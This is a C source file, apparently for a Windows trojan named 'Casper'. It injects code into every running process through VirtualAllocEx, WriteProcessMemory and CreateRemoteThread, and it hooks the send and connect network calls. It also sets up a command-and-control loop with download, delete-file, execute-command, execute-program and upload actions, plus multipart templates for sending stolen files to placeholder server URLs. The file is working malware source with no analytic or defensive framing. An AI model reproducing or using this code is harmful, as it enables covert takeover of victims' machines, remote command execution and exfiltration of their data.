#include "casper_utils.h"
#include "casper_inject.h"
#include "casper_trojan.h"



////////////////////////////////////////////////
//           First injection function         //
////////////////////////////////////////////////

int InjectProcess(DWORD dwPID)
{
	DWORD			*pInjCode;	
	DWORD			*pInjFunc;
	DWORD			*pInjSend;
	DWORD			*pInjConnect;
	DWORD			*pInjTrojGetCmd;
	DWORD			*pInjTrojDownloader;
	DWORD			*pInjTrojMain;
	DWORD			*pInjTrojExec ;
	DWORD			*pInjTrojUploader;
	DWORD			dwThreadId = 0;
	DWORD			lpNumberOfBytesWritten=0;
	HANDLE			hProcess;  
	HANDLE			hThread = NULL; 
	HINSTANCE		hDll;
	INJECTEDDATA	InjData;
	INJECTEDDATA	*pInjData;		


	// Open process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	if(hProcess == NULL)
		return 0;	

	////////////////////////////////////////////
	//  Memory allocation and function write  //
	////////////////////////////////////////////

	// InjectedMain
	pInjCode = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
									  MEM_COMMIT, PAGE_EXECUTE_READWRITE);		

	if(pInjCode == NULL)		
		return 0;
	
	WriteProcessMemory(hProcess, pInjCode, &InjectedMain, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);		
	

	// Injection function	
	pInjFunc = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
									  MEM_COMMIT, PAGE_EXECUTE_READWRITE);		

	if(pInjFunc == NULL)		
		return 0;
	
	
	WriteProcessMemory(hProcess, pInjFunc, &InjectProcessI, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);		
	

	// Send
	pInjSend = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjSend == NULL)		
		return 0;	
	
	WriteProcessMemory(hProcess, pInjSend, &SendHook, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// Connect
	pInjConnect = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjConnect == NULL)		
		return 0;	
	
	WriteProcessMemory(hProcess, pInjConnect, &ConnectHook, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);

	
	// TrojGetCmd
	pInjTrojGetCmd = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojGetCmd == NULL)		
		return 0;	
		
	WriteProcessMemory(hProcess, pInjTrojGetCmd, &TrojGetCmd, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojDownloader
	pInjTrojDownloader = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojDownloader == NULL)		
		return 0;	
	
	WriteProcessMemory(hProcess, pInjTrojDownloader, &TrojDownloader, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojMain
	pInjTrojMain = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojMain == NULL)		
		return 0;	
	
	WriteProcessMemory(hProcess, pInjTrojMain, &TrojMain, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojExec
	pInjTrojExec = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojExec == NULL)		
		return 0;	
		
	WriteProcessMemory(hProcess, pInjTrojExec, &TrojExec, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);


	// TrojUploader
	pInjTrojUploader = (PDWORD)VirtualAllocEx(hProcess, 0, INJECT_SIZE, 
										MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	
	if(pInjTrojUploader == NULL)		
		return 0;	
		
	WriteProcessMemory(hProcess, pInjTrojUploader, &TrojUploader, INJECT_SIZE, 
					   &lpNumberOfBytesWritten);

	////////////////////////////////////////////	


	// Load kernel32.dll
	hDll = LoadLibrary("kernel32.dll");

	if(hDll == NULL)		
		return 0;	


	// Init of injected data struct
	InjData.fnLoadLibrary	 = (injLoadLibrary) GetProcAddress(hDll, "LoadLibraryA");
	InjData.fnGetProcAddress = (injGetProcAddress) GetProcAddress(hDll, "GetProcAddress");

	// Some init	
	InjData.bProxy = FALSE;
	InjData.bProxyAuth = FALSE;
	InjData.dwSend = 0;
	InjData.bTrojGetCmd = TRUE;
	
	
	// DLL names to load
	strcpy(InjData.lpKernel32, "kernel32.dll");
	strcpy(InjData.lpUser32, "user32.dll");
	strcpy(InjData.lpPsapi, "psapi.dll");
	strcpy(InjData.lpImagehlp, "imagehlp.dll"); 
	strcpy(InjData.lpMsvcrt, "msvcrt.dll");
	strcpy(InjData.lpWs2_32, "ws2_32.dll"); 
	strcpy(InjData.lpShlwapi, "shlwapi.dll"); 
	strcpy(InjData.lpWininet, "wininet.dll"); 	

	// Trojan specific strings
	strcpy(InjData.lpTrojCmdDownload, "DOWNLOAD");
	strcpy(InjData.lpTrojCmdDelfile, "DELFILE");
	strcpy(InjData.lpTrojCmdExecCMD, "EXECMD");
	strcpy(InjData.lpTrojCmdExecProg, "EXECPROG");
	strcpy(InjData.lpTrojCmdUpload, "UPLOAD");	
	strcpy(InjData.lpTrojLogFormatOK_A, "%s%s %s %s - OK");
	strcpy(InjData.lpTrojLogFormatOK_B, "%s%s %s - OK");
	strcpy(InjData.lpTrojLogFormatERROR_A, "%s%s %s %s - ERROR");
	strcpy(InjData.lpTrojLogFormatERROR_B, "%s%s %s - ERROR");
	strcpy(InjData.lpTrojCmdFormat, "%s > %s");	
	strcpy(InjData.lpTrojPOST, "POST");
	strcpy(InjData.lpTrojGET, "GET");
	strcpy(InjData.lpTrojContentLength, "Content-Length: %d\r\n");	
	strcpy(InjData.lpTrojContentType, "Content-Type: multipart/form-data; "
								      "boundary=---------------------------7d414e351603fa\r\n");
	strcpy(InjData.lpTrojMimeHeader,
			"-----------------------------7d414e351603fa\r\n"
			"Content-Disposition: form-data; name=\"upload\"; filename=\"%s\"\r\n"
			"Content-Type: application/octet-stream\r\n"
			"\r\n");	
	strcpy(InjData.lpTrojMimeTail,
			"\r\n-----------------------------7d414e351603fa\r\n"
			"Content-Disposition: form-data; name=\"submit\"\r\n\r\n"
			"Upload Files\r\n"
			"-----------------------------7d414e351603fa--\r\n");
	strcpy(InjData.lpUserAgent, "Mozilla/4.0 (compatible; MSIE 6.0; Win32)");	
	strcpy(InjData.lpCMD_URL, CMD_URL);
	strcpy(InjData.lpRES_URL, RES_URL);
	strcpy(InjData.lpSERVER, SERVER);
	strcpy(InjData.lpUP_URL, UP_URL);
	
	// Others strings	
	strcpy(InjData.lpSharedMemName, "MSSharedMemory");
	strcpy(InjData.lpFormat, "%s%d");
	strcpy(InjData.lpFormatDebug, "%d");
	strcpy(InjData.lpFormatProxy, "%s:%d");	
	strcpy(InjData.lpMutexName, "WIN_MUTEX_");
	strcpy(InjData.lpReturn, "\n");
	strcpy(InjData.lpProxyBanner, "Proxy-Authorization:");
	strcpy(InjData.lpProxyGET, "GET http://");	
	strcpy(InjData.lpCmdTest, "Injection OK");
	strcpy(InjData.lpDebugConnect, "CONNECT HOOK");
	strcpy(InjData.lpDebugSend, "SEND HOOK");
	strcpy(InjData.lpError, "ERROR ");


	// Function pointers
	InjData.fnFunction = pInjCode;	
	InjData.fnInjectionFunc = pInjFunc;
	InjData.fnSendHook = (injSend)pInjSend;
	InjData.fnConnectHook = (injConnect)pInjConnect;
	InjData.fnTrojGetCmd = pInjTrojGetCmd;
	InjData.fnTrojDownloader = pInjTrojDownloader;
	InjData.fnTrojMain = pInjTrojMain;
	InjData.fnTrojExec = pInjTrojExec;
	InjData.fnTrojUploader = pInjTrojUploader;

	// API names to load
  	strcpy(InjData.injFunction[0], "WinExec");
	strcpy(InjData.injFunction[1], "OpenProcess");
	strcpy(InjData.injFunction[2], "VirtualAllocEx");
	strcpy(InjData.injFunction[3], "WriteProcessMemory");
	strcpy(InjData.injFunction[4], "CreateRemoteThread");
	strcpy(InjData.injFunction[5], "CreateMutexA");
	strcpy(InjData.injFunction[6], "sprintf");
	strcpy(InjData.injFunction[7], "_getpid");
	strcpy(InjData.injFunction[8], "CreateToolhelp32Snapshot");
	strcpy(InjData.injFunction[9], "Process32First");
	strcpy(InjData.injFunction[10], "Process32Next");
	strcpy(InjData.injFunction[11], "CloseHandle");
	strcpy(InjData.injFunction[12], "OpenMutexA");
	strcpy(InjData.injFunction[13], "WaitForSingleObject");
	strcpy(InjData.injFunction[14], "ReleaseMutex");
	strcpy(InjData.injFunction[15], "MessageBoxA");
	strcpy(InjData.injFunction[16], "Sleep");
	strcpy(InjData.injFunction[17], "EnumProcessModules");
	strcpy(InjData.injFunction[18], "GetCurrentProcess");
	strcpy(InjData.injFunction[19], "ImageDirectoryEntryToData");
	strcpy(InjData.injFunction[20], "send");
	strcpy(InjData.injFunction[21], "VirtualQuery"); 
	strcpy(InjData.injFunction[22], "VirtualProtect"); 
	strcpy(InjData.injFunction[23], "CreateFileMappingA");
	strcpy(InjData.injFunction[24], "MapViewOfFile");
	strcpy(InjData.injFunction[25], "GetModuleHandleA");
	strcpy(InjData.injFunction[26], "FlushInstructionCache");
	strcpy(InjData.injFunction[27], "VirtualAlloc");
	strcpy(InjData.injFunction[28], "GetLastError");
	strcpy(InjData.injFunction[29], "SetLastError");
	strcpy(InjData.injFunction[30], "MessageBeep");
	strcpy(InjData.injFunction[31], "OutputDebugStringA");
	strcpy(InjData.injFunction[32], "strtok");
	strcpy(InjData.injFunction[33], "strncmp");
	strcpy(InjData.injFunction[34], "StrChrA");
	strcpy(InjData.injFunction[35], "StrStrIA");
	strcpy(InjData.injFunction[36], "connect");
	strcpy(InjData.injFunction[37], "ntohs");
	strcpy(InjData.injFunction[38], "inet_ntoa");
	strcpy(InjData.injFunction[39], "StrCpyNW");
	strcpy(InjData.injFunction[40], "ExitThread");
	strcpy(InjData.injFunction[41], "InternetOpenA");
	strcpy(InjData.injFunction[42], "InternetOpenUrlA");
	strcpy(InjData.injFunction[43], "InternetCloseHandle");
	strcpy(InjData.injFunction[44], "malloc");
	strcpy(InjData.injFunction[45], "InternetReadFile");
	strcpy(InjData.injFunction[46], "realloc");
	strcpy(InjData.injFunction[47], "HeapAlloc");
	strcpy(InjData.injFunction[48], "HeapReAlloc");
	strcpy(InjData.injFunction[49], "GetProcessHeap");
	strcpy(InjData.injFunction[50], "HeapCreate");
	strcpy(InjData.injFunction[51], "CreateFileA");
	strcpy(InjData.injFunction[52], "WriteFile");
	strcpy(InjData.injFunction[53], "CloseHandle");
	strcpy(InjData.injFunction[54], "CreateProcessA");
	strcpy(InjData.injFunction[55], "DeleteFileA");	
	strcpy(InjData.injFunction[56], "GetFileSize");
	strcpy(InjData.injFunction[57], "ReadFile");
	strcpy(InjData.injFunction[58], "InternetConnectA");
	strcpy(InjData.injFunction[59], "HttpOpenRequestA");
	strcpy(InjData.injFunction[60], "HttpAddRequestHeadersA");
	strcpy(InjData.injFunction[61], "HttpSendRequestExA");
	strcpy(InjData.injFunction[62], "InternetWriteFile");
	strcpy(InjData.injFunction[63], "HttpEndRequestA");
	strcpy(InjData.injFunction[64], "GetTickCount");
	strcpy(InjData.injFunction[65], "OpenProcess");
	strcpy(InjData.injFunction[66], "VirtualAllocEx");
	strcpy(InjData.injFunction[67], "WriteProcessMemory");
	strcpy(InjData.injFunction[68], "CreateRemoteThread");
	strcpy(InjData.injFunction[69], "VirtualFreeEx");
		

	// Memory allocation for injected data
	pInjData = (INJECTEDDATA *)VirtualAllocEx(hProcess, 0, sizeof(INJECTEDDATA), 
											  MEM_COMMIT, PAGE_READWRITE );	

	if(pInjData == NULL)		
		return 0;	

	// Write injected data into target process memory
	WriteProcessMemory(hProcess, pInjData, &InjData, sizeof(INJECTEDDATA), 
					   &lpNumberOfBytesWritten);
			
	// Exec of InjectedMain
	hThread = CreateRemoteThread(hProcess, NULL, 0,
								 (DWORD(__stdcall *) (void *)) pInjCode,
								 pInjData, 0 , &dwThreadId);

	if(hThread == NULL)
		return 0;  		

	return 1;
}


////////////////////////////////////////////////
//                   Main                     //
////////////////////////////////////////////////

int main(int argc, char *argv[])
{     		
	HANDLE			hProcessSnap  = NULL; 
	DWORD			th32ProcessID = 0;
	BOOL			bRet          = FALSE; 
	PROCESSENTRY32	pe32          = {0}; 

	
	// Processes snapshot
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

	if(hProcessSnap == INVALID_HANDLE_VALUE) 
		return 0; 
 
	// Process structure init
	pe32.dwSize = sizeof(PROCESSENTRY32); 
 
	// For each process
	th32ProcessID = Process32First(hProcessSnap, &pe32);
	
	while(th32ProcessID) 
	{	   
		// Injection
		InjectProcess(pe32.th32ProcessID);
			
		pe32.dwSize = sizeof(PROCESSENTRY32);
		th32ProcessID = Process32Next(hProcessSnap, &pe32);
	}
        	
	CloseHandle(hProcessSnap);     
	
	return 1;	
}


